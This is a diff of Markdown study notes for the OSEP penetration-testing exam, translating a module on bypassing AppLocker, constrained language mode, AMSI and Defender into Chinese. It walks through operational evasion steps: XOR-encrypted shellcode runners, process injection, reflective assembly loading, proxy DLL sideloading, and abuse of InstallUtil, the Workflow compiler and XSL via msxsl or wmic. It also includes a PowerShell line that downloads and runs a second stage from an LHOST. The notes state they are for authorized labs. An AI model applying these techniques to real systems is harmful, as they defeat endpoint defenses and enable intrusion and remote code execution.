@@ -1,31 +1,27 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 05 — AppLocker / CLM / AMSI 绕过与受信任宿主
+# 模块 M05：AppLocker / CLM / AMSI 绕过与受信任宿主
 
-Enumerate AppLocker, language mode, and AMSI. Distinguish static delete vs behavioral kill. Use trusted hosts (InstallUtil, Workflow, XSL).
+> 覆盖场景：18、19、20、21、22、23、24
+> > 教材依据：第 11 章（AV 规避）、第 13 章（AppLocker / CLM 绕过）、第 8–9 章（托管程序集加载）
+> 前置依赖：一个可执行代码的入口（宏 / HTA / JScript / Web）；目标有 Defender + 可能启用 AppLocker、CLM；攻击机可编译 C#/C
 
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：18、19、20、21、22、23、24
-> > Course mapping：第 11 章（AV 规避）、第 13 章（AppLocker / CLM 绕过）、第 8–9 章（托管程序集加载）
-> Prerequisites：一个可执行代码的入口（宏 / HTA / JScript / Web）；目标有 Defender + 可能启用 AppLocker、CLM；attacker box可编译 C#/C
-
-**Rules for this module**：先**分清被拦的是"加载器"还是"执行内容"**。这两类失败的修法完全不同——加载器被查杀要改静态特征与宿主形态，执行内容被拦要改行为与分阶段。考试里最常见的错误是：被拦后只反复改静态编码，而问题其实出在行为。
+**本模块的共同原则**：先**分清被拦的是"加载器"还是"执行内容"**。这两类失败的修法完全不同——加载器被查杀要改静态特征与宿主形态，执行内容被拦要改行为与分阶段。考试里最常见的错误是：被拦后只反复改静态编码，而问题其实出在行为。
 
 ---
 
-## Scenario 18：自定义 EXE 一落地就被删除
+## 场景 18：自定义 EXE 一落地就被删除
 
-**Situation**：目标允许上传文件，但你准备的 Runner 在启动前就被隔离；简单无害程序可以保存和执行。→ 说明**落地文件的静态特征**被命中，而不是执行行为。
+**场景回顾**：目标允许上传文件，但你准备的 Runner 在启动前就被隔离；简单无害程序可以保存和执行。→ 说明**落地文件的静态特征**被命中，而不是执行行为。
 
-**Assumptions**：
+**前提与假设**：
 - 已有文件投递通道（HTTP/SMB/Web 上传）。
 - 能观察到"文件消失"或"进程未创建"。
-- attacker box可编译自定义 Runner（mingw-w64 / csc）。
+- 攻击机可编译自定义 Runner（mingw-w64 / csc）。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 
 1. 建立对照基线——先投一个无害程序，确认投递与执行本身没问题：
    ```bash
@@ -38,11 +34,11 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    ```
 3. 准备自定义 C# Runner（不用 msfvenom 模板，减少公共特征）：
    ```bash
-   # target上编译（如果 csc 可用）
+   # 目标机上编译（如果 csc 可用）
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
    ```
 
-**Procedure**：
+**执行步骤**：
 
 1. 投递无害程序，确认能落地、能运行 → 证明投递通道正常。
 2. 投递自定义 Runner（先不带 payload，只打印），观察是否被删：
@@ -52,7 +48,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 4. 换成编码/加密版本：shellcode 以密文数组形式内嵌，运行时在内存中 XOR 解密；字符串拆分成多段拼接。
 5. 换宿主形态：不落地独立 EXE，改用 InstallUtil 程序集 / 托管程序集加载 / PowerShell 反射（见场景 20、23）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m13-xor-encoder.py` | 生成 XOR 编码后的 C 数组 | `sc.bin --format c` |
@@ -375,27 +371,27 @@ if ($ProbeOnly) {
 }
 ````
 
-**Verify**：投递后 `dir` 确认文件存在；运行后 `tasklist` 确认进程；监听端确认回连。三者缺一都要重新定位。
+**验证**：投递后 `dir` 确认文件存在；运行后 `tasklist` 确认进程；监听端确认回连。三者缺一都要重新定位。
 
-**If it fails**：
+**失败分支与备选**：
 1. 换编码仍被删 → 加载器本身被特征化 → 改用受信任宿主（InstallUtil / Workflow / XSL，场景 23、24）或托管程序集加载（场景 20）。
 2. 文件能落地但 Defender 报毒 → 关闭实时保护（若已有管理员权限，见 `Defense Evasion` → Disable Defender），或改用内存执行不落地。
 3. 目标禁止执行任何未签名 EXE → 直接放弃 EXE 路线，转 AppLocker 允许路径（场景 21）或 DLL（场景 22）。
 
-**Exam notes / OPSEC**：先做无害对照，否则你无法判断"是投递失败还是被查杀"；每次只改一个变量并记录；不要在同一台机器上反复投递同一特征文件（可能触发更激进的拦截）。
+**考试注意 / OPSEC**：先做无害对照，否则你无法判断"是投递失败还是被查杀"；每次只改一个变量并记录；不要在同一台机器上反复投递同一特征文件（可能触发更激进的拦截）。
 
 ---
 
-## Scenario 19：EXE 能保存、能启动，但开始执行内容时被终止
+## 场景 19：EXE 能保存、能启动，但开始执行内容时被终止
 
-**Situation**：文件落地没问题，运行初期也正常；进入后续执行或通信阶段后进程被终止。→ 这是**行为检测**，不是静态查杀。
+**场景回顾**：文件落地没问题，运行初期也正常；进入后续执行或通信阶段后进程被终止。→ 这是**行为检测**，不是静态查杀。
 
-**Assumptions**：
+**前提与假设**：
 - 场景 18 的对照实验已证明文件能落地、能启动。
 - 目标存在行为监控（Defender 的 Behavior Monitor / EDR 规则）。
 - 可生成多种执行实现做对照。
 
-**Prepare (attacker)**：准备三组对照样本
+**准备（攻击机侧）**：准备三组对照样本
 
 | 样本 | 实现 | 观察点 |
 |---|---|---|
@@ -405,17 +401,17 @@ if ($ProbeOnly) {
 
 ```bash
 # 参照 cheat sheet：C# Process Injection / DLL Shellcode Inject
-# 生成后先用无害 payload（弹出计算器或写文件）Verify行为，再换真实 payload
+# 生成后先用无害 payload（弹出计算器或写文件）验证行为，再换真实 payload
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 投递 A（进程内），观察终止点：是分配内存时、创建线程时，还是网络连接时。
-2. 若在**通信阶段**被终止 → 问题在 C2 通道而非注入（转 [09-c2-egress-channels](/modules/09-c2-egress-channels)）。
+2. 若在**通信阶段**被终止 → 问题在 C2 通道而非注入（转 [09-c2-egress-channels](/zh/modules/09-c2-egress-channels)）。
 3. 若在**注入 API** 处被终止 → 换 B / C 实现，或改为加载托管程序集（`Assembly.Load`，避免显式 `VirtualAlloc`）。
 4. 若在**解密后执行**处被终止 → 换 payload 形态（staged、更小的 shellcode、HTTP 而非 TCP 回连）。
 5. 记录每组的终止点，形成"行为—拦截"对照表（这份表在考试报告里很值钱）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m01-shellcode-runner-x64.cs` | 进程内执行（样本 A） | 换 payload 与 key |
@@ -511,33 +507,33 @@ Write-Output "    2) 反射加载程序集：. .\m01-reflective-runner.ps1 -Path
 Write-Output "    3) 下载执行第二阶段：IEX (New-Object Net.WebClient).DownloadString('http://LHOST/stage2.ps1')"
 ````
 
-**Verify**：进程是否存活到发起网络连接；监听端是否收到连接；`Get-MpThreatDetection` 是否有告警记录。
+**验证**：进程是否存活到发起网络连接；监听端是否收到连接；`Get-MpThreatDetection` 是否有告警记录。
 
-**If it fails**：
+**失败分支与备选**：
 1. 三种注入实现都被拦 → 改用受信任宿主加载（场景 23、24），或走托管程序集（场景 20）。
 2. 只在发起外连时被拦 → 走代理/DNS/域前置（`docs/09`）。
 3. 只在特定 payload 被拦 → 换 payload 而非换注入方式。
 
-**Exam notes / OPSEC**：行为检测靠"差异"触发，别在同一进程里连续尝试多种注入；每次尝试间隔开，并在失败后确认进程是否已被标记。
+**考试注意 / OPSEC**：行为检测靠"差异"触发，别在同一进程里连续尝试多种注入；每次尝试间隔开，并在失败后确认进程是否已被标记。
 
 ---
 
-## Scenario 20：需要使用托管工具，但其 EXE 文件不能落地运行
+## 场景 20：需要使用托管工具，但其 EXE 文件不能落地运行
 
-**Situation**：已经有一个可执行托管逻辑的宿主；某个 .NET 工具直接落地运行被限制，但它的程序集格式适合在现有宿主中加载。→ **原生 EXE ≠ 托管程序集**，要换加载方式。
+**场景回顾**：已经有一个可执行托管逻辑的宿主；某个 .NET 工具直接落地运行被限制，但它的程序集格式适合在现有宿主中加载。→ **原生 EXE ≠ 托管程序集**，要换加载方式。
 
-**Assumptions**：
+**前提与假设**：
 - 已有能执行 .NET 代码的宿主（PowerShell、自定义 C# 宿主、Office 宏内的 .NET 调用）。
 - 目标工具是托管程序集（.NET DLL）或可被 `Assembly.Load` 加载的字节流。
 - 不能直接运行其 EXE（AppLocker / AV / 权限限制）。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 ```bash
 # 拿到工具的托管程序集（DLL），必要时从 EXE 中提取为程序集
 # 本机可用 mcs / dotnet 编译测试用程序集
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 确认目标是托管程序集：
    ```powershell
    [Reflection.AssemblyName]::GetAssemblyName("C:\path\tool.dll").FullName
@@ -553,7 +549,7 @@ Write-Output "    3) 下载执行第二阶段：IEX (New-Object Net.WebClient).D
 3. 依赖处理：把依赖程序集放到同一目录，或用 `AppDomain.AssemblyResolve` 事件从内存解析。
 4. 输出适配：工具原本写控制台/文件，反射调用时捕获返回值或重定向输出。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m05-installutil-runner.cs` | 托管程序集加载器模板 | 替换程序集路径/入口 |
@@ -744,29 +740,29 @@ try {
 }
 ````
 
-**Verify**：`$asm.FullName` 是否成功返回；反射调用是否返回预期结果；有无落地文件产生。
+**验证**：`$asm.FullName` 是否成功返回；反射调用是否返回预期结果；有无落地文件产生。
 
-**If it fails**：
+**失败分支与备选**：
 1. 工具是原生 EXE（非托管）→ 不能反射加载 → 改用 InstallUtil/宿主（场景 23）或找同功能的托管替代。
 2. `Assembly.Load` 被 AMSI/CLM 拦 → 先做 AMSI 处理与 Runspace 绕过（本模块脚本），再加载。
 3. 依赖缺失 → 用 `AssemblyResolve` 内存解析，或把依赖目录加入 `AppDomain.BaseDirectory`。
 
-**Exam notes / OPSEC**：反射调用不会产生新的进程，日志面更小；但参数必须与工具入口严格匹配，考试前先在本机Verify一遍调用签名。
+**考试注意 / OPSEC**：反射调用不会产生新的进程，日志面更小；但参数必须与工具入口严格匹配，考试前先在本机验证一遍调用签名。
 
 ---
 
-## Scenario 21：普通 EXE 被 AppLocker 拒绝，但特定目录存在允许规则
+## 场景 21：普通 EXE 被 AppLocker 拒绝，但特定目录存在允许规则
 
-**Situation**：你有普通用户会话，上传的程序在当前目录不能运行；有效策略允许某些路径，其中可能存在当前用户可写的位置。
+**场景回顾**：你有普通用户会话，上传的程序在当前目录不能运行；有效策略允许某些路径，其中可能存在当前用户可写的位置。
 
-**Assumptions**：
+**前提与假设**：
 - AppLocker 的 EXE 规则集生效，默认路径（如 `C:\Users\Public`）被拒。
 - 策略中存在允许目录（常见：`C:\Windows\Tasks`、`C:\Windows\Temp`、用户 profile 下某些目录）。
 - 当前用户对这些目录有写权限。
 
-**Prepare (attacker)**：无需特殊准备，用脚本枚举即可。
+**准备（攻击机侧）**：无需特殊准备，用脚本枚举即可。
 
-**Procedure**：
+**执行步骤**：
 1. 枚举有效策略（注意 CLM 下可能无法解析 XML，用脚本兜底）：
    ```powershell
    Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml
@@ -789,7 +785,7 @@ try {
    ```
 4. 把 payload 投递到"允许 + 可写"的目录，从那里执行。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m05-applocker-enum.ps1` | 枚举有效规则 + 可写允许路径 | `-PayloadPath` 可选 |
@@ -906,42 +902,42 @@ if ($writable.Count -gt 0) {
 Write-Both ("`n报告已保存: {0}" -f $OutFile)
 ````
 
-**Verify**：在目标目录直接运行 `cmd /c whoami` 或你的 payload，确认不再被策略阻止；`Test-Path` 与 `icacls` 输出留档。
+**验证**：在目标目录直接运行 `cmd /c whoami` 或你的 payload，确认不再被策略阻止；`Test-Path` 与 `icacls` 输出留档。
 
-**If it fails**：
+**失败分支与备选**：
 1. 没有可写允许目录 → 转 DLL 路线（场景 22）或受信任宿主（场景 23、24）。
 2. 策略解析被 CLM 限制 → 用 `Get-AppLockerPolicy -Effective -Xml` 落地后离线解析，或直接暴力试探常见目录。
 3. 允许目录存在但 Defender 拦 payload → 结合场景 18 的编码方案。
 
-**Exam notes / OPSEC**：AppLocker 只限制"从哪里启动"，不限制"启动什么"之外的行为；先确认策略版本（`Get-AppLockerPolicy -Effective` 在 Win10+ 才可用），旧系统用 `Get-AppLockerPolicy -Local` 或直接读 `%windir%\System32\AppLocker\*.xml`。
+**考试注意 / OPSEC**：AppLocker 只限制"从哪里启动"，不限制"启动什么"之外的行为；先确认策略版本（`Get-AppLockerPolicy -Effective` 在 Win10+ 才可用），旧系统用 `Get-AppLockerPolicy -Local` 或直接读 `%windir%\System32\AppLocker\*.xml`。
 
 ---
 
-## Scenario 22：EXE 规则严格，但 DLL 规则和宿主允许条件不同
+## 场景 22：EXE 规则严格，但 DLL 规则和宿主允许条件不同
 
-**Situation**：普通自定义程序不能直接启动，但一个已允许的应用能加载外部 DLL，且对应 DLL 加载没有被有效规则阻止。
+**场景回顾**：普通自定义程序不能直接启动，但一个已允许的应用能加载外部 DLL，且对应 DLL 加载没有被有效规则阻止。
 
-**Assumptions**：
+**前提与假设**：
 - AppLocker 的 DLL 规则集未启用或较宽松（默认不启用 DLL 规则）。
 - 存在一个被允许、且会从可影响位置加载 DLL 的宿主程序。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 ```bash
 # 用 Proxy DLL 思路：导出全转发 + DllMain 中执行载荷
 x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def -s
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 确认 DLL 规则集状态：
    ```powershell
    (Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
    ```
    `Dll` 类型不存在或为 AuditOnly → DLL 路线可行。
 2. 找到允许的宿主程序及其 DLL 搜索路径（同目录优先）。
-3. 把 DLL 放到宿主的搜索路径，保持导出函数与调用约定与原 DLL 一致（见 [04-dll-sideloading](/modules/04-dll-sideloading) 场景 12）。
+3. 把 DLL 放到宿主的搜索路径，保持导出函数与调用约定与原 DLL 一致（见 [04-dll-sideloading](/zh/modules/04-dll-sideloading) 场景 12）。
 4. 启动宿主，确认载荷执行且宿主功能正常。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m04-proxy-dll-sideload.c` | 全转发 Proxy DLL | 替换原 DLL 名 |
@@ -1436,34 +1432,34 @@ if __name__ == "__main__":
     sys.exit(main(sys.argv[1:]))
 ````
 
-**Verify**：宿主是否正常启动（不闪退）；DLL 中的载荷是否执行；`whoami` 或回连确认。
+**验证**：宿主是否正常启动（不闪退）；DLL 中的载荷是否执行；`whoami` 或回连确认。
 
-**If it fails**：
+**失败分支与备选**：
 1. DLL 规则集启用且严格 → 转受信任宿主（场景 23、24）。
 2. 宿主闪退 → 导出表/调用约定不匹配（`docs/04` 场景 12）。
 3. 宿主不加载同目录 DLL → 找其它支持旁加载的宿主，或用 `PATH` 劫持。
 
-**Exam notes / OPSEC**：AppLocker 的 DLL 规则默认不启用——这是考试中最省事的路径之一；但别把它当作必然，先查策略。
+**考试注意 / OPSEC**：AppLocker 的 DLL 规则默认不启用——这是考试中最省事的路径之一；但别把它当作必然，先查策略。
 
 ---
 
-## Scenario 23：InstallUtil 不可用，但教材中的其他受信任执行宿主可用
+## 场景 23：InstallUtil 不可用，但教材中的其他受信任执行宿主可用
 
-**Situation**：InstallUtil 路线被策略阻止，目标却保留了 Workflow 编译宿主及其所需环境。
+**场景回顾**：InstallUtil 路线被策略阻止，目标却保留了 Workflow 编译宿主及其所需环境。
 
-**Assumptions**：
+**前提与假设**：
 - AppLocker 阻止 InstallUtil（或其被移出允许列表）。
 - `Microsoft.Workflow.Compiler.exe` 存在且可执行（.NET Framework 4.0 目录）。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 ```bash
 # 编译 Workflow 输入程序集（含 XOML 逻辑的托管程序集）
 x86_64-w64-mingw32-gcc ...   # 不需要，用 csc.exe 编译 C# 即可
-# target上：
+# 目标机上：
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:payload.dll m05-workflow-compiler-runner.cs
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 确认宿主存在：
    ```powershell
    Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
@@ -1475,7 +1471,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:pay
    ```
 4. 确认载荷执行（回连/落地文件）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m05-workflow-compiler-runner.cs` | Workflow 宿主输入程序集 | 替换载荷逻辑 |
@@ -1615,28 +1611,28 @@ where mshta
 - 场景流程：`docs/05-applocker-clm-amsi.md`
 ````
 
-**Verify**：命令返回无异常；监听端回连；`output.xml` 生成（说明宿主确实执行）。
+**验证**：命令返回无异常；监听端回连；`output.xml` 生成（说明宿主确实执行）。
 
-**If it fails**：
+**失败分支与备选**：
 1. Workflow 宿主也被阻止 → 试 XSL（场景 24）、MSBuild、`regsvr32`（脚本宿主）、`mshta`（HTA 路线）。
 2. .NET 版本目录不同 → 枚举 `C:\Windows\Microsoft.NET\Framework*` 下所有 `v*` 目录。
 3. CLM 影响 PowerShell 调用 → 用 `cmd /c` 直接调用宿主，不经 PowerShell。
 
-**Exam notes / OPSEC**：受信任宿主的价值在于"允许列表内 + 不落地自定义 EXE"；命令要写全路径，避免依赖 PATH。
+**考试注意 / OPSEC**：受信任宿主的价值在于"允许列表内 + 不落地自定义 EXE"；命令要写全路径，避免依赖 PATH。
 
 ---
 
-## Scenario 24：普通脚本入口受限，但 XSL 处理路线可用
+## 场景 24：普通脚本入口受限，但 XSL 处理路线可用
 
-**Situation**：常规脚本执行受限，但对应组件仍能处理带脚本逻辑的 XSL，且有效策略允许调用它。
+**场景回顾**：常规脚本执行受限，但对应组件仍能处理带脚本逻辑的 XSL，且有效策略允许调用它。
 
-**Assumptions**：
+**前提与假设**：
 - PowerShell/VBScript 入口被限制。
 - `msxsl.exe` 或 `wmic.exe` 可用，且能处理内嵌 JScript/VBScript 的 XSL。
 
-**Prepare (attacker)**：编写 XSL，内含 `<msxsl:script language="JScript">` 或通过 `wmic` 的格式化执行路径。
+**准备（攻击机侧）**：编写 XSL，内含 `<msxsl:script language="JScript">` 或通过 `wmic` 的格式化执行路径。
 
-**Procedure**：
+**执行步骤**：
 1. 用 `msxsl.exe`（若存在）：
    ```cmd
    msxsl.exe payload.xml payload.xsl
@@ -1647,7 +1643,7 @@ where mshta
    ```
 3. 载荷逻辑写在 XSL 的脚本块里（下载执行/回连）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m05-xsl-exec.xsl` | XSL 脚本执行模板 | 替换 LHOST/URL |
@@ -1701,14 +1697,14 @@ where mshta
 </xsl:stylesheet>
 ````
 
-**Verify**：命令无报错；回连或落地文件出现；`msxsl`/`wmic` 进程确实创建。
+**验证**：命令无报错；回连或落地文件出现；`msxsl`/`wmic` 进程确实创建。
 
-**If it fails**：
+**失败分支与备选**：
 1. `msxsl.exe` 不存在（默认不随系统安装）→ 用 `wmic` 的 `/format` 路线。
 2. XSL 脚本被 AMSI 扫 → 把被检测字符串拆分/编码，或改由 XSL 仅做下载器、第二阶段单独投递。
 3. 策略允许 `wmic` 但不允许 `/format` → 换其它受信任宿主（场景 23）。
 
-**Exam notes / OPSEC**：`wmic` 在新系统上可能被移除（Win11 24H2+），考试前先 `where wmic` 确认；XSL 路线的优势是常被策略忽略。
+**考试注意 / OPSEC**：`wmic` 在新系统上可能被移除（Win11 24H2+），考试前先 `where wmic` 确认；XSL 路线的优势是常被策略忽略。
 
 ---
 
